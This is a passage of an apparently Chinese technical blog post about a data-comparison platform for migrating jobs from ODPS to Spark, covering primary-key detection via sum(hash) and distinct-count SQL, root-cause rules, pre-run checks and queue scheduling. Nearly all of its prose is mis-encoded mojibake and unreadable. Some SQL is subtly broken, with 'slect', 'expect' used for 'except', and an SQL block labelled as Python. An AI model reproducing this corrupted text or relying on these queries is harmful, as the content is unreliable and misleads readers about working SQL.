<p>åˆšå¼€å§‹æˆ‘ä»¬é‡‡ç”¨çš„å‰5ä¸ªå­—æ®µæ‰¾ä¸»é”®çš„æ–¹å¼ï¼Œå¦‚ä¸‹ï¼š</p>
<pre><code class="hljs language-sql" lang="sql">é’ˆå¯¹è¡¨açš„å‰<span class="hljs-number">5</span>ä¸ªå­—æ®µ å¾ªç¯æ¯”å¯¹
<span class="hljs-keyword">select</span>Â <span class="hljs-built_in">count</span>(<span class="hljs-keyword">distinct</span>Â id)Â <span class="hljs-keyword">from</span>Â a ä¸Â <span class="hljs-keyword">select</span>Â <span class="hljs-built_in">count</span>(<span class="hljs-number">1</span>)Â <span class="hljs-keyword">from</span>Â a æ¯”è¾ƒ ï¼Œå¦‚ç›¸ç­‰ä¸»é”®ä¸ºid ï¼Œä¸ç›¸ç­‰ç»§ç»­å¾€ä¸‹æ‰§è¡Œ
<span class="hljs-keyword">select</span>Â <span class="hljs-built_in">count</span>(<span class="hljs-keyword">distinct</span>Â id,name)Â <span class="hljs-keyword">from</span>Â a ä¸Â <span class="hljs-keyword">select</span>Â <span class="hljs-built_in">count</span>(<span class="hljs-number">1</span>)Â <span class="hljs-keyword">from</span>Â aæ¯”è¾ƒï¼Œå¦‚ç›¸ç­‰ä¸»é”®ä¸ºid,name ï¼Œä¸ç›¸ç­‰ç»§ç»­å¾€ä¸‹æ‰§è¡Œ
<span class="hljs-keyword">select</span>Â <span class="hljs-built_in">count</span>(<span class="hljs-keyword">distinct</span>Â id,name,age)Â <span class="hljs-keyword">from</span>Â a ä¸Â <span class="hljs-keyword">select</span>Â <span class="hljs-built_in">count</span>(<span class="hljs-number">1</span>)Â <span class="hljs-keyword">from</span>Â aæ¯”è¾ƒï¼Œå¦‚ç›¸ç­‰ä¸»é”®ä¸ºid,name,age ï¼Œä¸ç›¸ç­‰ç»§ç»­å¾€ä¸‹æ‰§è¡Œï¼Œç›´åˆ°å¾ªç¯ç»“æŸ
</code></pre>
<p>é‡‡ç”¨ä¸Šé¢çš„æ–¹æ³•ä¸ä¸€è‡´ä»»åŠ¡ä¸­å¤§çº¦æœ‰49.6%ä»»åŠ¡è‡ªåŠ¨æ¢æŸ¥ä¸»é”®å¤±è´¥ï¼šå› æ­¤éœ€é‡ç‚¹æå‡ä¸»é”®è¯†åˆ«èƒ½åŠ›ã€‚</p>
<p>é’ˆå¯¹ä»¥ä¸Šä¸»é”®æ¢æŸ¥æˆåŠŸç‡ä½çš„é—®é¢˜ï¼Œåç»­è¿›è¡Œäº†ä¸€äº›è¿­ä»£ï¼Œä¼˜åŒ–åçš„ä¸»é”®æ¢æŸ¥æµç¨‹å¦‚ä¸‹ï¼š</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/25de1d35ecd9418799133d350c66238f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5b6X54mp5oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769494627&amp;x-signature=Wjo6Kt0tO3xPN7AfPoPRzpqHXII%3D" alt="" loading="lazy"/><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer"/></p>
<p><strong>ä¸€ã€å…ˆé‡‡ç”¨sum(hash)é«˜æ•ˆè®¡ç®—æ–¹å¼è¿›è¡Œæ¢æŸ¥ï¼š</strong></p>
<p>1.å…ˆç®—å‡ºä¸¤å¼ è¡¨æ¯ä¸ªå­—æ®µçš„sum(hash)å€¼ Â ã€‚</p>
<pre><code class="hljs language-python" lang="python">selectÂ <span class="hljs-built_in">sum</span>(<span class="hljs-built_in">hash</span>(<span class="hljs-built_in">id</span>)),<span class="hljs-built_in">sum</span>(<span class="hljs-built_in">hash</span>(name)),<span class="hljs-built_in">sum</span>(<span class="hljs-built_in">hash</span>(age)),<span class="hljs-built_in">sum</span>(<span class="hljs-built_in">hash</span>(score))Â <span class="hljs-keyword">from</span>Â aÂ 
unionÂ <span class="hljs-built_in">all</span>Â 
selectÂ <span class="hljs-built_in">sum</span>(<span class="hljs-built_in">hash</span>(<span class="hljs-built_in">id</span>)),<span class="hljs-built_in">sum</span>(<span class="hljs-built_in">hash</span>(name)),<span class="hljs-built_in">sum</span>(<span class="hljs-built_in">hash</span>(age)),<span class="hljs-built_in">sum</span>(<span class="hljs-built_in">hash</span>(score))Â <span class="hljs-keyword">from</span>Â b;
</code></pre>
<p>2.æ‰¾å‡ºå€¼ç›¸ç­‰çš„æ‰€æœ‰å­—æ®µï¼Œæœ¬æ¡ˆä¾‹ä¸­ä¸º id, nameã€‚</p>
<p>3.å¯¹idï¼Œname å¯èƒ½æ˜¯ä¸»é”®è¿›ä¸€æ­¥ç¡®è®¤ï¼Œå…ˆè¿›è¡Œè¡Œæ•°æ ¡éªŒï¼Œå¦‚ select count(distinct id,name) from a çš„å€¼ç­‰äºselect count(1) from a åˆ™è¿›ä¸€æ­¥æ ¡éªŒï¼Œå¦åˆ™è¿›å…¥åˆ°ç¬¬äºŒç§æ¢æŸ¥ä¸»é”®æ–¹å¼ã€‚</p>
<p>4.å”¯ä¸€æ€§éªŒè¯ï¼Œå¦‚æœå€¼ä¸º0åˆ™è¡¨ç¤ºæ¢æŸ¥ä¸»é”®æˆåŠŸï¼Œå¦åˆ™è¿›å…¥åˆ°ç¬¬äºŒç§æ¢æŸ¥ä¸»é”®æ–¹å¼ã€‚</p>
<pre><code class="hljs language-sql" lang="sql">slect <span class="hljs-built_in">count</span>(<span class="hljs-operator">*</span>)Â <span class="hljs-keyword">from</span>Â ((<span class="hljs-keyword">select</span>Â id,nameÂ <span class="hljs-keyword">from</span>Â aÂ ) expect (<span class="hljs-keyword">select</span>Â id,nameÂ <span class="hljs-keyword">from</span>Â b))
</code></pre>
<p><strong>äºŒã€ä¼ ç»Ÿdistinctæ–¹å¼æ¢æŸ¥ï¼š</strong></p>
<p>é’ˆå¯¹è¡¨açš„å‰Nï¼ˆæ‰€æœ‰å­—æ®µæ•°/2æˆ–è€…å‰Nã€åNç­‰ï¼‰ä¸ªå­—æ®µ å¾ªç¯æ¯”å¯¹ï¼š</p>
<p>1.select count(distinct id) from aä¸select count(1) from aæ¯”è¾ƒ ï¼Œå¦‚ç›¸ç­‰ä¸»é”®ä¸ºid ï¼Œä¸ç›¸ç­‰ç»§ç»­å¾€ä¸‹æ‰§è¡Œã€‚</p>
<p>2.select count(distinct id,name) from a ä¸ select count(1) from aæ¯”è¾ƒï¼Œå¦‚ç›¸ç­‰ä¸»é”®ä¸ºid,name ï¼Œä¸ç›¸ç­‰ç»§ç»­å¾€ä¸‹æ‰§è¡Œã€‚</p>
<p>3.select count(distinct id,name,age) from a ä¸ select count(1) from aæ¯”è¾ƒï¼Œå¦‚ç›¸ç­‰ä¸»é”®ä¸ºid,name,age ï¼Œä¸ç›¸ç­‰ç»§ç»­å¾€ä¸‹æ‰§è¡Œï¼Œç›´åˆ°å¾ªç¯ç»“æŸã€‚</p>
<p><strong>ä¸‰ã€å…¨å­—æ®µæ’åºæ¨¡æ‹Ÿ:</strong></p>
<p>å¦‚æœä¸Šé¢ä¸¤ç§æ–¹å¼è¿˜æ˜¯æ²¡æœ‰æ‰¾åˆ°ä¸»é”®åˆ™æŠŠä¸ä¸€è‡´è®°å½•è¡¨è¿›è¡Œå…¨å­—æ®µæ’åºç„¶åå¯¹ç¬¬ä¸€æ¡å’Œç¬¬äºŒæ¡è®°å½•æŒ¨ä¸ªå­—æ®µè¿›è¡Œåˆ†æï¼Œæ‰¾å‡ºä¸ä¸€è‡´å†…å®¹ï¼Œç¤ºä¾‹å¦‚ä¸‹ï¼š</p>
<pre><code class="hljs language-sql" lang="sql">slectÂ <span class="hljs-operator">*</span>Â <span class="hljs-keyword">from</span>Â a_b_diff_20240908Â <span class="hljs-keyword">order</span>Â <span class="hljs-keyword">by</span>Â id,name,age,scoreÂ <span class="hljs-keyword">asc</span>Â limitÂ <span class="hljs-number">10</span>;
</code></pre>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6ef9f06f43484d919849196643d03729~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5b6X54mp5oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769494627&amp;x-signature=93VYsc%2F3m8FGe%2F%2BFZ4xlzVDTTwM%3D" alt="" loading="lazy"/><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer"/></p>
<p>é€šè¿‡ä»¥ä¸Šç»“æœè¡¨å¯ä»¥å¾—å‡ºä¸¤è¡¨çš„ageå­—æ®µä¸ä¸€è‡´ ï¼Œscoreä¸ä¸€è‡´ï¼ˆä½†æŒ‰keyæ’åºåä¸€è‡´ï¼‰ã€‚</p>
<p>å¦‚æœä»¥ä¸Šè‡ªåŠ¨åŒ–åˆ†æè¿˜æ˜¯æ‰¾ä¸åˆ°ä¸ä¸€è‡´å­—æ®µå†…å®¹ï¼Œå¯ä»¥äººå·¥ç¡®è®¤è¡¨çš„ä¸»é”®ååˆ°å¹³å°æ‰‹åŠ¨æŒ‡å®šä¸»é”®å­—æ®µï¼Œç„¶åç‚¹å‡»åç»­åˆ†æå³å¯æŒ‰æŒ‡å®šä¸»é”®å»æ‰¾å­—æ®µä¸ä¸€è‡´å†…å®¹ã€‚</p>
<p>é€šè¿‡å¤šæ¬¡è¿­ä»£ä¼˜åŒ–æ‰¾ä¸»é”®ç­–ç•¥ï¼Œæ‰¾ä¸»é”®æˆåŠŸç‡ä»æœ€åˆçš„50.4%æå‡åˆ°75%ï¼ŒåŠ ä¸Šå…¨å­—æ®µorder byæ’åºåæœ€å‰ä¸¤æ¡æ•°æ®è¿›è¡Œåˆ†æï¼Œç›¸å½“äºå¯ä»¥æŠŠæ‰¾ä¸»é”®çš„æˆåŠŸç‡æå‡åˆ°90%ä»¥ä¸Šã€‚</p>
<p><strong>æ ¹å› åˆ†æï¼šå®ç°åŸç†å¦‚ä¸‹</strong></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8ffcd921dc69410094ec2ad734d3d602~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5b6X54mp5oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769494627&amp;x-signature=kmEILGcn3E9X17tys3Y5%2FUB5IZ4%3D" alt="" loading="lazy"/><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer"/></p>
<p>å½“æ•°æ®ä¸ä¸€è‡´æ—¶ï¼Œå¹³å°ä¼šæ ¹æ®ä¸»é”®æ‰¾å‡ºä¸¤ä¸ªè¡¨å“ªäº›å­—æ®µæ•°æ®ä¸ä¸€è‡´å¹¶è¿›è¡Œåˆ†æï¼Œå…·ä½“å¦‚ä¸‹ï¼š</p>
<ul>
<li><strong>ç²¾å‡†å®šä½ï¼š</strong> æ˜ç¡®æŒ‡å‡ºå“ªæ¡è®°å½•ã€å“ªä¸ªå­—æ®µå­˜åœ¨å·®å¼‚ï¼Œå¹¶å±•ç¤ºå…·ä½“çš„æºæ•°æ®å’Œç›®æ ‡æ•°æ®å€¼ã€‚</li>
<li><strong>æ™ºèƒ½æ ¹å› åˆ†æï¼š</strong> å†…ç½®äº†å¤šç§å·®å¼‚æ¨¡å¼è¯†åˆ«è§„åˆ™ï¼Œèƒ½å¤Ÿè‡ªåŠ¨åˆ†æå¹¶æç¤ºä¸ä¸€è‡´çš„å¯èƒ½åŸå› ï¼Œä¾‹å¦‚ï¼š</li>
<li>ç²¾åº¦é—®é¢˜ï¼šå¦‚æµ®ç‚¹æ•°è®¡ç®—1.0000000001ä¸1.0çš„å·®å¼‚ã€‚</li>
<li>JSONåºåˆ—åŒ–å·®å¼‚ï¼šå¦‚{"a":1, "b":2}ä¸{"b":2, "a":1}ï¼Œåœ¨è¯­ä¹‰ä¸€è‡´çš„æƒ…å†µä¸‹ï¼Œå› é”®å€¼å¯¹é¡ºåºä¸åŒè€Œè¢«æ ‡è®°ä¸ºå·®å¼‚ã€‚åŒæ—¶ç³»ç»Ÿä¼šæç¤ºæ’åºåä¸€è‡´ã€‚</li>
<li>ç©ºå€¼å¤„ç†å·®å¼‚ï¼šå¦‚NULLå€¼ä¸ç©ºå­—ç¬¦ä¸²""çš„å·®å¼‚åˆ¤å®šã€‚</li>
<li>æ—¥æœŸæ—¶åŒºè½¬æ¢é—®é¢˜ï¼šæ—¶é—´æˆ³åœ¨ä¸åŒæ—¶åŒºä¸‹è¡¨ç¤ºä¸åŒã€‚</li>
</ul>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/26c3c92ec4094f0eb0dc64b0c3a3daaa~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5b6X54mp5oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769494627&amp;x-signature=PQ4B4wonmvnK84sqnaWxqZlsgM8%3D" alt="" loading="lazy"/><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer"/></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/db0212b45a6146c198ea412952b6c8ae~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5b6X54mp5oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769494627&amp;x-signature=doO%2B5Vt8WX%2FyAR4AE3z8DGP3Kqk%3D" alt="" loading="lazy"/><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer"/></p>
<ul>
<li><strong>æ¯”å¯¹ç»“æœç»Ÿè®¡ï¼š</strong> æä¾›æ€»æ•°æ®é‡ã€ä¸€è‡´æ•°æ®é‡ã€ä¸ä¸€è‡´æ•°æ®é‡åŠä¸ä¸€è‡´ç‡ç™¾åˆ†æ¯”ï¼Œä¸ºé¡¹ç›®å†³ç­–æä¾›æ¸…æ™°çš„é‡åŒ–ä¾æ®ã€‚</li>
<li>æ¯”æ•°äººå‘˜æ ¹æ®å¹³å°åˆ†æçš„å·®å¼‚åŸå› ï¼Œå†³å®šæ˜¯å¦æ‰‹åŠ¨æ ‡è®°é€šè¿‡æˆ–è¿›è¡Œä»»åŠ¡ä¿®å¤ã€‚</li>
<li>æ•ˆæœå±•ç¤ºï¼š</li>
</ul>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/566d75faee4a4dcc8c8e637eadd32d6b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5b6X54mp5oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769494627&amp;x-signature=Qup%2FMQqwspWtDPW4WNLQ2poZzcw%3D" alt="" loading="lazy"/><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer"/></p>
<h2 data-id="heading-8">å››ã€æ¯”æ•°å¹³å°åŠŸèƒ½ä»‹ç»</h2>
<h3 data-id="heading-9">æ•°æ®æ¯”å¯¹åŸºæœ¬æµç¨‹</h3>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2c09f97130ba45678aec2b50638b2aee~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5b6X54mp5oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769494627&amp;x-signature=9hhTVjtN0R7usRnpaw%2BwbwtCvkI%3D" alt="" loading="lazy"/><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer"/></p>
<h3 data-id="heading-10">ä»»åŠ¡ç”Ÿæˆï¼šä¸‰ç§æ¯”å¯¹æ¨¡å¼</h3>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/bbb2b1b4aa2c49ea8e0b6a80477808bd~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5b6X54mp5oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769494627&amp;x-signature=YRfferO3wRHg%2FjEP7FpFuLC70CE%3D" alt="" loading="lazy"/><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer"/></p>
<ul>
<li><strong>ä¸¤è¡¨æ¯”å¯¹ï¼š</strong> æœ€ç›´æ¥çš„æ¯”å¯¹æ–¹å¼ã€‚ç”¨æˆ·åªéœ€æŒ‡å®šæºè¡¨ä¸ç›®æ ‡è¡¨ï¼Œå¹³å°å³å¯å¯åŠ¨å…¨é‡æ•°æ®æ¯”å¯¹ã€‚å®ƒé€‚ç”¨äºä¸´æ—¶æ¯”å¯¹çš„åœºæ™¯ã€‚</li>
<li><strong>ä»»åŠ¡èŠ‚ç‚¹æ¯”å¯¹ï¼š</strong> ä¸€ä¸ªä»»åŠ¡å¯èƒ½è¾“å‡ºå¤šä¸ªè¡¨ï¼Œé€ä¸€é…ç½®è¿™äº›è¡¨çš„æ¯”å¯¹ä»»åŠ¡ç¹çä¸”æ˜“é—æ¼ï¼Œä»»åŠ¡èŠ‚ç‚¹æ¯”å¯¹æ¨¡å¼å®Œç¾è§£å†³äº†è¿™ä¸€é—®é¢˜ã€‚ç”¨æˆ·åªéœ€æä¾›ä»»åŠ¡èŠ‚ç‚¹IDï¼Œå¹³å°ä¾¿ä¼šè‡ªåŠ¨è§£æè¯¥èŠ‚ç‚¹å¯¹åº”çš„SQLä»£ç ï¼Œæå–å‡ºæ‰€æœ‰è¾“å‡ºè¡¨ï¼Œå¹¶è‡ªåŠ¨ç”Ÿæˆæ¯”å¯¹ä»»åŠ¡ï¼Œæå¤§åœ°æå‡ä»»åŠ¡è¿ç§»æ¯”å¯¹æ•ˆç‡ã€‚</li>
<li><strong>SQLæŸ¥è¯¢æ¯”å¯¹ï¼š</strong> ä¸šåŠ¡åœ¨è¿›è¡ŒSDKè¿ç§»åªå…³å¿ƒæŸäº›æŸ¥è¯¢åœ¨è¿ç§»åæ•°æ®æ˜¯å¦ä¸€æ ·ï¼Œå› æ­¤éœ€è¦å¯¹ç”¨æˆ·æäº¤çš„æ‰€æœ‰æŸ¥è¯¢SQLè¿›è¡Œæ¯”å¯¹ï¼Œå¹³å°ä¼šåˆ†åˆ«åœ¨ODPSå’ŒSparkå¼•æ“ä¸Šæ‰§è¡Œè¯¥æŸ¥è¯¢ï¼Œå°†ç»“æœé›†å¯¼å‡ºåˆ°ä¸¤å¼ ä¸´æ—¶è¡¨ï¼Œå†ç”Ÿæˆæ¯”å¯¹ä»»åŠ¡ã€‚</li>
</ul>
<h3 data-id="heading-11">å‰ç½®æ ¡éªŒï¼šæå‰å‘ç°é—®é¢˜</h3>
<p>åœ¨å¯åŠ¨è€—æ—¶çš„å…¨é‡æ¯”å¯¹ä¹‹å‰ï¼Œéœ€è¦å¯¹ä»»åŠ¡è¿›è¡Œå‰ç½®æ ¡éªŒï¼Œç¡®ä¿æ¯”å¯¹æ˜¯åœ¨è¡¨ç»“æ„ä¸€è‡´ã€é›†ç¾¤ç¯å¢ƒæ­£å¸¸çš„æƒ…å†µä¸‹è¿›è¡Œï¼Œå¦åˆ™ä¸€æ—¦å¯åŠ¨æ¯”æ•°ä¼šå ç”¨å¤§é‡è®¡ç®—èµ„æºï¼Œæœ€åç»“æœè¿˜æ˜¯æ¯”æ•°ä¸é€šè¿‡ï¼Œä¼šå½±å“æ¯”æ•°å¹³å°æ•´ä½“çš„è¿è¡Œæ•ˆç‡ã€‚å› æ­¤æ¯”æ•°å¹³å°ä¸€èˆ¬ä¼šé’ˆå¯¹å¦‚ä¸‹é—®é¢˜è¿›è¡Œå‰ç½®æ‹¦æˆªã€‚</p>
<ul>
<li><strong>å…ƒæ•°æ®ä¸€è‡´æ€§æ ¡éªŒï¼š</strong> æ¯”å¯¹åŒæ–¹çš„å­—æ®µåã€å­—æ®µç±»å‹ã€å­—æ®µé¡ºåºã€å­—æ®µä¸ªæ•°æ˜¯å¦ä¸€è‡´ã€‚</li>
<li><strong>å‡½æ•°ç¼ºå¤±æ ¡éªŒï¼š</strong> é’ˆå¯¹Sparkå¼•æ“ï¼Œæ ¡éªŒSQLä¸­ä½¿ç”¨çš„å‡½æ•°æ˜¯å¦å­˜åœ¨ã€æ˜¯å¦èƒ½è¢«æ­£ç¡®è¯†åˆ«ï¼Œé¿å…å› å‡½æ•°ä¸æ”¯æŒè€Œå¯¼è‡´çš„æ¯”å¯¹å¤±è´¥ã€‚</li>
<li><strong>è¯­æ³•é—®é¢˜æ ¡éªŒï¼š</strong> åˆ†æSQLè¯­å¥çš„è¯­æ³•ç»“æ„ï¼Œç¡®ä¿å…¶åœ¨ç›®æ ‡å¼•æ“ä¸­èƒ½å¤Ÿè¢«é¡ºåˆ©è§£æï¼Œé¿å…ä½¿ç”¨äº†æŸäº›ç‰¹å®šå†™æ³•ä¼šå¯¼è‡´æ•°æ®å‡ºç°ä¸ä¸€è‡´æƒ…å†µï¼Œæå‰å‘ç°è¯­æ³•å±‚é¢é—®é¢˜ï¼Œå¹¶å¯¹ä»»åŠ¡è¿›è¡Œæ”¹å†™ã€‚</li>
</ul>
<p><strong>æ›´å¤šæ ¡éªŒç‚¹å¦‚ä¸‹ï¼š</strong></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/40910e32074f4c28b70c5226fe902490~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5b6X54mp5oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769494627&amp;x-signature=cl7EeqzAo8AMMIzBZASeWeuzhSI%3D" alt="" loading="lazy"/><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer"/></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/30dbeda7f2a446b99d9ee8fc0d9c6c6a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5b6X54mp5oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769494627&amp;x-signature=6g%2BNoCOop3TpZbTpS0mtpBEIKl4%3D" alt="" loading="lazy"/><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer"/></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a120da92c35046a1aee83c9da7f81915~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5b6X54mp5oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769494627&amp;x-signature=jC9MNlPrk1%2FlYM1LW1%2FVh%2BDyB1I%3D" alt="" loading="lazy"/><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer"/></p>
<p>é€šè¿‡å¢åŠ ä»¥ä¸Šå‰ç½®æ ¡éªŒæ‹¦æˆªï¼Œæ¯”æ•°ä»»åŠ¡æ•°ä»æ¯å¤©3000+<strong>ä¸‹é™åˆ°1500+ï¼Œ</strong> å‡å°‘<strong>50%</strong> çš„æ— æ•ˆæ¯”æ•°ï¼Œå…¶ä¸­UDFç¼ºå¤±æœ€å¤šï¼Œæœ‰æ•ˆæ‹¦æˆªä»»åŠ¡1238ï¼Œç¼ºå°‘å‡½æ•°<strong>87ä¸ª</strong>ï¼ˆå¸®æ¯”æ•°åŒå­¦å¿«é€Ÿå®šä½ï¼Œä¸€æ¬¡æ€§è§£å†³å‡½æ•°ç¼ºå¤±é—®é¢˜ï¼Œé¿å…å¤šæ¬¡æ‰¾å¼•æ“åŒå­¦é™†é™†ç»­ç»­æ·»åŠ ï¼ŒèŠ‚çœåŒæ–¹æ—¶é—´æˆæœ¬ï¼‰ã€‚</p>
<h3 data-id="heading-12">ç ´è§£æ¯”æ•°ç“¶é¢ˆï¼šèµ„æºåˆ†é…ä¸ä»»åŠ¡è°ƒåº¦ä¼˜åŒ–</h3>
<p>ç”±äºæ¯”æ•°å¹³å°åˆšä¸Šçº¿çš„æ—¶å€™åªæœ‰è®¡ç®—è¿ç§»å›¢é˜Ÿåœ¨ä½¿ç”¨ï¼Œåé¢éšç€æ›´å¤šçš„å›¢é˜Ÿå¼€å§‹ä½¿ç”¨ï¼Œæ€§èƒ½é‡åˆ°äº†å¦‚ä¸‹ç“¶é¢ˆï¼š</p>
<p><strong>1.èµ„æºä¸è¶³é—®é¢˜ï¼š</strong> ä¸åŒä¸šåŠ¡ï¼ˆè®¡ç®—è¿ç§»ã€å­˜å‚¨è¿ç§»ã€SDKè¿ç§»ï¼‰çš„ä»»åŠ¡ç›¸äº’å½±å“ï¼ŒåŸºæœ¬æ¯”æ•°ä»»åŠ¡ä¸æ ¹å› åˆ†æä»»åŠ¡ç›¸äº’æŠ¢å èµ„æºã€‚</p>
<p><strong>2.ä»»åŠ¡ç¼–æ’ä¸åˆç†ï¼š</strong> æ²¡æœ‰ä¼˜å…ˆçº§å¯¼è‡´å¤§ä»»åŠ¡é˜»å¡æ•´ä½“æ¯”æ•°è¿›ç¨‹ã€‚</p>
<p><strong>3.å¼•æ“å‚æ•°è®¾ç½®ä¸åˆç†ï¼š</strong> å¹¶è¡Œåº¦ä¸å¤Ÿã€æ•°æ®åˆ†å—å¤§å°ç­‰é«˜çº§å‚æ•°ã€‚</p>
<p>é’ˆå¯¹ä»¥ä¸Šé—®é¢˜æ¯”æ•°å¹³å°è¿›è¡Œäº†å¦‚ä¸‹ä¼˜åŒ–ï¼š</p>
<ul>
<li>æŒ‰ä¸åŒä¸šåŠ¡æ‹†åˆ†æˆå¤šä¸ªé˜Ÿåˆ—æ¥è¿è¡Œï¼Œä¿è¯å„ä¸ªä¸šåŠ¡ä¹‹é—´çš„æ¯”æ•°ä»»åŠ¡å¯ä»¥åŒæ—¶è¿›è¡Œï¼Œä¸ä¼šç›¸äº’å½±å“ã€‚</li>
<li>æ ¹å› åˆ†æä½¿ç”¨å•ç‹¬çš„é˜Ÿåˆ—ï¼Œä¸æ•°æ®æ¯”å¯¹ä»»åŠ¡çš„é˜Ÿåˆ—åˆ†å¼€ï¼Œé¿å…ç›¸äº’æŠ¢å èµ„æºå‘ç”Ÿâ€œæ­»é”â€ã€‚</li>
<li>ç›¸åŒä¸šåŠ¡å†…éƒ¨æŒ‰æ‰¹æ¬¡åˆ†æ—¶æ®µã€åˆ†ä¼˜å…ˆçº§è¿è¡Œï¼Œä¿éšœé‡è¦ä»»åŠ¡ä¼˜å…ˆè¿›è¡Œæ¯”å¯¹ã€‚</li>
<li>é’ˆå¯¹Sparkå¼•æ“é»˜è®¤è°ƒä¼˜äº†å…¬å…±å‚æ•°ã€å¹¶æ”¯æŒç”¨æˆ·è‡ªä¸»è®¾ç½®å…¶ä»–é«˜çº§å‚æ•°ã€‚</li>
</ul>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/df0b85bd8ac74968b0b75b0d7ee4b9dd~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5b6X54mp5oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769494627&amp;x-signature=35%2FJ9DEW8CBXqiho9N9hYZA0Mtw%3D" alt="" loading="lazy"/><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer"/></p>
<p>é€šè¿‡ä»¥ä¸Šä¼˜åŒ–è¾¾åˆ°åˆ°äº†å¦‚ä¸‹æ•ˆæœï¼š</p>
<ul>
<li>æ¯”æ•°ä»»åŠ¡ä»æ¯å¤©22ç‚¹å®Œæˆæå‰è‡³<strong>18ç‚¹</strong>å‰ï¼ŒåŒæ—¶æ”¯æŒæ¯”æ•°åŒå­¦è‡ªä¸»æ§åˆ¶é«˜ä¼˜ä»»åŠ¡ä¼˜å…ˆæ‰§è¡Œï¼Œæ–¹ä¾¿æ¯”æ•°åŒå­¦åŠæ—¶å¤„ç†ä¸ä¸€è‡´ä»»åŠ¡ã€‚</li>
<li>é€šè¿‡ä¼˜åŒ–èµ„æºé˜Ÿåˆ—ä½¿ç”¨æ–¹å¼ï¼Œä½¿ç³»ç»Ÿæ‰¾ä¸åˆ°ä¸»é”®è¾…åŠ©ç”¨æˆ·è‡ªä¸»æ‰¾ä¸»é”®æ¥å£å“åº”æ—¶é—´<strong>ä»58.5ç§’é™åˆ° 26.2ç§’ã€‚</strong></li>
</ul>
<h2 data-id="heading-13">äº”ã€æ¯”æ•°å¹³å°æ”¶ç›Šåˆ†äº«</h2>
<p>å¹³å°æŒç»­å®‰å…¨è¿è¡Œ500+å¤©ï¼Œæ¯æ—¥å¯å®Œæˆ2000+ä»»åŠ¡æ¯”å¯¹ï¼Œæœ‰æ•ˆæ¯”æ•°128ä¸‡+æ¬¡ï¼Œ0è¯¯åˆ¤ã€‚</p>
<ul>
<li>åŠ©åŠ›è®¡ç®—è¿ç§»å›¢é˜ŸèŠ‚çœ45+äººæ—¥/æœˆï¼Œå®Œæˆæ•°æ®åˆ†æã€ç¦»çº¿æ•°ä»“ç©ºé—´ä»»åŠ¡çš„æ¯”å¯¹ã€äº¤å‰²ã€‚</li>
<li>åŠ©åŠ›å­˜å‚¨è¿ç§»å›¢é˜Ÿå®Œæˆ20%+å­˜å‚¨æ•°æ®çš„è¿ç§»ã€‚</li>
